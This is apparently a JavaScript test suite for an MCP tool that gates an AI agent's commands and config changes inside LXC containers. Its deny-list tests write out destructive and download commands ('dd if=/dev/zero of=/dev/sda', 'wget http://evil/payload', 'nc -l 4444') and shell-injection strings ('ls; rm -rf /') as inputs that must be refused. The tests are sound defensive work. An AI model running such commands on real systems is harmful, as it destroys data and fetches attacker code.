test('parseLxcCommand: deny_always wins, including reordered curl output flags', () => {
  for (const cmd of [
    'rm -rf /opt/app', 'mv /a /b', 'dd if=/dev/zero of=/dev/sda',
    'shutdown now', 'reboot',
    'docker compose down', 'docker rm web', 'docker system prune -f', 'docker volume rm data',
    'apt install nmap', 'apt-get update', 'dpkg -i pkg.deb',
    'iptables -F', 'nft flush ruleset',
    'sh -c ls', 'bash script.sh', 'python3 x.py', 'node evil.js',
    'chmod 777 /etc/shadow', 'chown root /tmp/x',
    'ssh host', 'nc -l 4444', 'wget http://evil/payload',
    'curl -o /tmp/x http://evil/', 'curl --output /tmp/x http://evil/',
    // The reordering hole: -o buried behind other flags must still be denied.
    'curl -sS -o /tmp/x http://evil/', 'curl -fsSL http://evil/ -o /opt/app/x',
  ]) {
    const r = parseLxcCommand(cmd, LXC_POLICY, WD);
    assert.ok(r.error, `should deny: ${cmd}`);
  }
});

test('parseLxcCommand: shell syntax and non-plain args are rejected with guidance', () => {
  for (const cmd of ['ls | grep x', 'ls > /tmp/out', 'ls; rm -rf /', 'ls && reboot', 'echo $(id)', 'ls `id`', 'ls &']) {
    const r = parseLxcCommand(cmd, LXC_POLICY, WD);
    assert.ok(r.error, cmd);
    assert.match(r.error, /shell|plain argument/i, cmd);
  }
  assert.match(parseLxcCommand('', LXC_POLICY, WD).error, /required/);
  assert.match(parseLxcCommand('ls "a b"', LXC_POLICY, WD).error, /plain argument/);
});

test('parseLxcCommand: mutating commands are scoped to the registered working dir', () => {
  const ok = parseLxcCommand('docker compose up -d', LXC_POLICY, WD);
  assert.equal(ok.error, undefined);
  assert.equal(ok.scope, 'mutating_scoped');
  // Wrong dir → refused, naming the registered dir.
  const wrong = parseLxcCommand('docker compose restart', LXC_POLICY, { workingDir: '/etc', registeredWorkingDir: '/opt/app' });
  assert.match(wrong.error, /\/opt\/app/);
  // No registered startup at all → refused too.
  const none = parseLxcCommand('docker compose pull', LXC_POLICY, { workingDir: '/opt/app', registeredWorkingDir: null });
  assert.match(none.error, /no registered startup/);
  // docker compose up needs the FULL prefix: bare "docker compose upgrade" is
  // not a prefix match of ["docker","compose","up","-d"].
  assert.ok(parseLxcCommand('docker compose up', LXC_POLICY, WD).error);
});

test('parseLxcCommand: unknown commands get the what-IS-allowed answer', () => {
  const r = parseLxcCommand('vmstat 1 5', LXC_POLICY, WD);
  assert.match(r.error, /not in the allowlist/);
  assert.match(r.error, /docker/);
});

test('lxcCommandTimeoutMs follows the policy window', () => {
  assert.equal(lxcCommandTimeoutMs(undefined, LXC_POLICY), 120000);
  assert.equal(lxcCommandTimeoutMs(300, LXC_POLICY), 300000);
  assert.equal(lxcCommandTimeoutMs(99999, LXC_POLICY), 1800000);
  assert.equal(lxcCommandTimeoutMs(0, {}), 120000);
});

test('policy file shape: read_only, scoped, deny lists all present and argv-shaped', () => {
  for (const entry of LXC_POLICY.read_only) assert.ok(Array.isArray(entry) && entry.length >= 1);
  for (const entry of LXC_POLICY.mutating_scoped.commands) assert.ok(Array.isArray(entry));
  for (const entry of LXC_POLICY.deny_always.commands) assert.ok(Array.isArray(entry));
  assert.ok(LXC_POLICY.shell_syntax_rejected.includes('|'));
  assert.ok(LXC_POLICY.output_cap_bytes >= 64 * 1024);
});

test('lxcContainerDetail maps addresses, config subset, and snapshots', () => {
  const d = lxcContainerDetail({
    status: 'Running',
    created_at: '2026-08-01T00:00:00Z',
    profiles: ['default'],
    config: {
      'security.nesting': 'true', 'security.privileged': 'false',
      'limits.memory': '4GB', 'boot.autostart': 'true',
      'image.os': 'Debian', 'volatile.eth0.hwaddr': '00:16:3e:aa:bb:cc',
    },
    state: {
      network: {
        lo: { addresses: [{ address: '127.0.0.1', family: 'inet', scope: 'local' }] },
        eth0: {
          addresses: [
            { address: '10.167.1.20', family: 'inet', scope: 'global', netmask: '24' },
            { address: 'fe80::1', family: 'inet6', scope: 'link' },
          ],
        },
      },
    },
    snapshots: [{ name: 'pre-privilege-flip', created_at: '2026-08-10T00:00:00Z' }],
  });
  assert.equal(d.status, 'Running');
  assert.deepEqual(d.addresses, [{ interface: 'eth0', address: '10.167.1.20', family: 'inet', netmask: '24' }]);
  // Only security./limits./boot. keys — image and volatile noise excluded.
  assert.deepEqual(Object.keys(d.config).sort(),
    ['boot.autostart', 'limits.memory', 'security.nesting', 'security.privileged']);
  assert.equal(d.snapshots[0].name, 'pre-privilege-flip');
  // Nothing blows up on a minimal instance.
  assert.deepEqual(lxcContainerDetail({}).addresses, []);
});

// ---- cycle 4: lifecycle/config gating ----

import {
  validSnapshotName, defaultSnapshotName, validateLxcConfigChange,
  validIpv4, validImageAlias,
} from '../lib/mcp-logic.js';

const CFG_POLICY = JSON.parse(
  readFileSync(new URL('../lib/mcp-policy/lxc-config-allowlist.json', import.meta.url), 'utf8'),
);

test('validateLxcConfigChange: allowlisted keys pass with their gates', () => {
  const nest = validateLxcConfigChange('security.nesting', 'true', {}, CFG_POLICY);
  assert.equal(nest.error, undefined);
  assert.equal(nest.restartRequired, true);
  assert.equal(nest.warning, null);

  const cpu = validateLxcConfigChange('limits.cpu', '4', {}, CFG_POLICY);
  assert.equal(cpu.restartRequired, false);
  assert.ok(validateLxcConfigChange('limits.cpu', 'four', {}, CFG_POLICY).error);

  assert.equal(validateLxcConfigChange('limits.memory', '8GB', {}, CFG_POLICY).error, undefined);
  assert.equal(validateLxcConfigChange('limits.memory', '512MiB', {}, CFG_POLICY).error, undefined);
  assert.ok(validateLxcConfigChange('limits.memory', 'lots', {}, CFG_POLICY).error);
  assert.ok(validateLxcConfigChange('security.nesting', 'yes', {}, CFG_POLICY).error);
});

test('validateLxcConfigChange: privileged=true needs acknowledge_risk and carries the warning', () => {
  const refused = validateLxcConfigChange('security.privileged', 'true', {}, CFG_POLICY);
  assert.match(refused.error, /acknowledge_risk/);
  assert.match(refused.error, /host root/);

  const ok = validateLxcConfigChange('security.privileged', 'true', { acknowledgeRisk: true }, CFG_POLICY);
  assert.equal(ok.error, undefined);
  // The warning rides on SUCCESS too — the tool presents the trade-off, it
  // does not just apply the flip.
  assert.match(ok.warning, /host root/);
  // Turning privileged OFF needs no acknowledgement.
  const off = validateLxcConfigChange('security.privileged', 'false', {}, CFG_POLICY);
  assert.equal(off.error, undefined);
  assert.equal(off.warning, null);
});

test('validateLxcConfigChange: non-allowlisted keys are rejected, dangerous ones with their rationale', () => {
  assert.match(validateLxcConfigChange('raw.lxc', 'x', {}, CFG_POLICY).error, /deliberately not writable.*host-level/i);
  assert.match(validateLxcConfigChange('raw.idmap', 'x', {}, CFG_POLICY).error, /orphan/i);
  const unknown = validateLxcConfigChange('user.foo', 'x', {}, CFG_POLICY);
  assert.match(unknown.error, /not a writable config key/);
  assert.match(unknown.error, /security\.nesting/);
});

test('snapshot names: custom validated, default sortable and deterministic', () => {
  assert.equal(validSnapshotName('pre-upgrade_2'), 'pre-upgrade_2');
  assert.equal(validSnapshotName('-bad'), null);
  assert.equal(validSnapshotName('has space'), null);
  assert.equal(validSnapshotName(''), null);
  assert.equal(defaultSnapshotName(new Date(Date.UTC(2026, 7, 12, 9, 5, 3))), 'pp-mcp-20260812-090503');
  assert.equal(defaultSnapshotName(new Date(Date.UTC(2026, 7, 12, 9, 5, 3)), 'pp-mcp-pre-security_privileged'),
    'pp-mcp-pre-security_privileged-20260812-090503');
});

test('validIpv4 and validImageAlias reject the confusing shapes', () => {
  assert.equal(validIpv4('10.167.1.20'), '10.167.1.20');
  assert.equal(validIpv4('256.1.1.1'), null);
  assert.equal(validIpv4('10.0.0.01'), null);
  assert.equal(validIpv4('10.0.0'), null);
  assert.equal(validIpv4('fe80::1'), null);
  assert.equal(validImageAlias('images:debian/12'), 'images:debian/12');
  assert.equal(validImageAlias('ubuntu:24.04'), 'ubuntu:24.04');
  assert.equal(validImageAlias('--vm'), null);
  assert.equal(validImageAlias('a b'), null);
  assert.equal(validImageAlias(''), null);
});
